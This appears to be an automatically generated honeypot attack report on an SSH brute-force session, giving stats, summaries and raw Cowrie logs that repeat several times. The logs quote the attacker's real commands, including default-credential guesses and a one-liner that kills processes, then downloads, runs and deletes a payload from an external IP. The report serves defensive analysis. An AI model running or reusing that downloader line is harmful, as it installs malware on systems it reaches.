
# Attack: fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054

<details>
<summary>
<h2>Quick Stats</h2>
</summary>


- This attack was carried out by a `1` unique source IP address(es): `204.76.203.13`
- A total of `5` sessions were logged. `1` sessions were successful logins.
- `5` login attempts were made. `1` were successful.
- `5` unique username/password pairs were attempted. `1` were successful.
- `1` unique destination ports were targeted: `2222`
- `5` unique source ports were used: `56388`, `56398`, `56402`, `54312`, `54330`
- `9` commands were input in total. `1` IP(s) and `0` URL(s) were found in the commands
- `2` unique malware samples were downloaded. `1` IP(s) and `0` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: `cowrie.log`, `cowrie.json`, `dshield.log`
- A total of `1040` log events were logged in `8` log files: `cowrie.2023-11-30.json`, `cowrie.2023-11-30.json`, `auth_random.json`, `auth_random.json`, `cowrie.2023-11-30.log`, `cowrie.2023-11-30.log`, `dshield.log`, `dshield.log`

</details>

---

## Summary of Attack Details, Methods, and Goals

### Attack Details
- **Attacker IP**: `204.76.203.13`
- **Target System IP**: `172.31.5.68`
- **SSH Version Used**: `SSH-2.0-libssh2_1.10.0`
- **Date of Attack**: Between `2023-10-24` and `2023-12-03` (ISC last seen date)
- **Malware Downloaded**: File named `ah` from `http://94.156.68.152/ah`
- **File Hashes**:
  - 'ah' script: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
  - '/tmp/rootsenpai': `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`
- **Indicators of Compromise (IOCs)**: Suspicious IP addresses, file hashes, unexpected network traffic, and commands executed indicative of malicious activity.

### Attack Methods
- Exploiting potential service or system vulnerabilities with common network equipment commands (`enable`, `system`, `shell`, `sh`, `linuxshell`).
- Downloading and executing a malicious script to fetch and run further payloads.
- Evading detection and cleaning up traces by deleting downloaded files and killing processes associated with deleted files.
- Using SSH and possibly attempting brute-force or credential stuffing attacks against the SSH service.

### Attack Goals
- To probe and identify any system vulnerabilities or misconfigurations for exploitation.
- To gain unauthorized access to the system, potentially through brute force or exploiting default or weak credentials.
- To download and execute arbitrary code with a likely intent to establish a foothold or persistence mechanism.
- To prepare the compromised system for further exploitation or malicious activities such as being part of a botnet.
- To conceal the attack and avoid detection by removing traces and using a script that downloads different binaries while attempting to kill processes that could reveal the attack.

This attack shows signs of an adversary attempting to gain and potentially maintain unauthorized access, execute arbitrary code for further exploitation, and conceal their activities to avoid detection and analysis. The evidence suggests a moderately sophisticated attacker utilizing a script-based approach to carry out the attack and possibly leverage the compromised system for further malfeasance. Corrective and preventive security measures should be employed to mitigate potential vulnerabilities and protect against such threats.

<details>
<summary>
<h3>Extended Summary</h3>
</summary>


- This attack was carried out by a `1` unique **source IP** address(es):
	- `SourceIP 204.76.203.13 with 5 sessions, 1 dst_ports 4 successful logins, 36 commands, 0 uploads, 16 downloads`

- `5` unique **source ports** were used:
	- `Src Port: 56388 Used 1 times`
	- `Src Port: 56398 Used 1 times`
	- `Src Port: 56402 Used 1 times`
	- `Src Port: 54312 Used 1 times`
	- `Src Port: 54330 Used 1 times`

- `1` unique **destination ports** were targeted:
	- `Dst Port: `2222` Used `5` times`

- A total of `5` sessions were logged:
	- `Session 7da06240e8e7 SSH 204.76.203.13:56388 -> 172.31.5.68:2222 Duration: 1.60s`
	- `Session 355bb09fda53 SSH 204.76.203.13:56398 -> 172.31.5.68:2222 Duration: 3.76s`
	- `Session 4410f6013e99 SSH 204.76.203.13:56402 -> 172.31.5.68:2222 Duration: 5.72s`
	- `Session 437a71e27810 SSH 204.76.203.13:54312 -> 172.31.5.68:2222 Duration: 1.58s`
	- `Session 651b145b8fb8 SSH 204.76.203.13:54330 -> 172.31.5.68:2222 Login: root:root Commands: 9, Malware: 4, Duration: 51.12s`

- `1` were **successful logins**, 
- `4` were **failed logins**, 
- `1` had commands, 
- `1` had malware.
- `5` unique username/password pairs were attempted. `1` were successful.
- `9` commands were input in total. `1` IP(s) and `0` URL(s) were found in the commands
- `2` unique malware samples were downloaded. 
- `1` IP(s) and `0` URL(s) were found in the malware samples
- This attacks was recorded in `3` log types: 
	- `cowrie.log`
	- `cowrie.json`
	- `dshield.log`

- A total of `1040` log events were logged in `6` log files: 
	- `cowrie.2023-11-30.json`
	- `cowrie.2023-11-30.json`
	- `auth_random.json`
	- `auth_random.json`
	- `cowrie.2023-11-30.log`
	- `cowrie.2023-11-30.log`
	- `dshield.log`
	- `dshield.log`


</details>

---


<details>
<summary>
<h1>Custom Scripts Used To Generate This Report</h1>
</summary>


| Script | Description |
| --- | --- |
| [logparser.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/logparser.py) | Base class for reading all logs as json objects with standardized keys |
| [cowrieloganalyzer.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/cowrieloganalyzer.py) | Python script for Analyzing Cowrie logs |
| [webloganalyzer.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/webloganalyzer.py) | Python script for Analyzing Web logs |
| [soupscraper.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/soupscraper.py) | Base class for scraping web pages with BeautifulSoup and Selenium |
| [ipanalyzer.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/ipanalyzer.py) | Python script for Analyzing IP addresses and domains |
| [markdownwriter.py](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/markdownwriter.py) | Python for writing markdown files |
| [getlogsbyip.sh](https://github.com/LucasFaudman/BACS-4498/blob/main/analyzer-scripts/getlogsbyip.sh) | Bash script for getting all logs for a given IP address |

</details>

---


<details>
<summary>
<h1>Time and Date of Activity</h1>
</summary>

First activity logged: `2023-11-30 01:41:53.570525`
* First session: `7da06240e8e7`
* `Session 7da06240e8e7 SSH 204.76.203.13:56388 -> 172.31.5.68:2222 Duration: 1.60s`

Last activity logged: `2023-11-30 01:42:57.643806`
* Last session: `651b145b8fb8`
* `Session 651b145b8fb8 SSH 204.76.203.13:54330 -> 172.31.5.68:2222 Login: root:root Commands: 9, Malware: 4, Duration: 51.12s`


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `7da06240e8e7` | `204.76.203.13` | `56388` | `2222` | `2023-11-30 01:41:53.570525` | `2023-11-30 01:41:55.166817` | `1.5956263542175293` |
| `651b145b8fb8` | `204.76.203.13` | `54330` | `2222` | `2023-11-30 01:42:06.527180` | `2023-11-30 01:42:57.643806` | `51.115936279296875` |

<details>
<summary>
<h3>All Sessions</h3>
</summary>


| Session ID | IP | Src Port | Dst Port | Start Time | End Time | Duration |
| --- | --- | --- | --- | --- | --- | --- |
| `7da06240e8e7` | `204.76.203.13` | `56388` | `2222` | `2023-11-30 01:41:53.570525` | `2023-11-30 01:41:55.166817` | `1.5956263542175293` |
| `355bb09fda53` | `204.76.203.13` | `56398` | `2222` | `2023-11-30 01:41:55.241425` | `2023-11-30 01:41:58.999284` | `3.7572450637817383` |
| `4410f6013e99` | `204.76.203.13` | `56402` | `2222` | `2023-11-30 01:41:59.074441` | `2023-11-30 01:42:04.793713` | `5.718630790710449` |
| `437a71e27810` | `204.76.203.13` | `54312` | `2222` | `2023-11-30 01:42:04.867954` | `2023-11-30 01:42:06.453447` | `1.5848052501678467` |
| `651b145b8fb8` | `204.76.203.13` | `54330` | `2222` | `2023-11-30 01:42:06.527180` | `2023-11-30 01:42:57.643806` | `51.115936279296875` |

</details>

---


</details>

---


<details>
<summary>
<h1>Relevant Logs, File or Email</h1>
</summary>


## Log Stats

| Log Name | Lines |
| --- | --- |
| cowrie.log | 584 |
| cowrie.json | 376 |
| dshield.log | 80 |

## Cowrie .log Logs
Total Cowrie logs: `584`

#### First Session With Commands 651b145b8fb8 Cowrie .log Logs
This sample shows the Cowrie `.log` Logs for session_id `651b145b8fb8` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .log Logs for 651b145b8fb8</h3>
</summary>


```verilog
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
